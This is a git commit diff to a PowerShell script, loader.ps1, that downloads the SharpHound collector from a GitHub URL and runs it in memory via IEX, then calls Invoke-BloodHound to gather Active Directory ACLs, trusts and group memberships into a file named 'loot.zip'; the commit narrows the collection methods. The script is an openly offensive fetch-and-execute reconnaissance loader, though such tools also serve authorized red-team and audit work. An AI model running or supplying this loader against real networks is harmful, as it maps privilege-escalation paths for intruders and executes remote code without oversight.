58d0343dcb13fdc96058bd90466549434c4c9136
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 20:02:24 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,6 +1,6 @@
 $code = @'
 IEX (([System.Net.WebClient]::new()).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'))
-Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
+Invoke-BloodHound -CollectionMethod ACL,Trusts,GroupMembership -ZipFileName loot.zip
 '@
 $sb = [ScriptBlock]::Create($code)
 & $sb
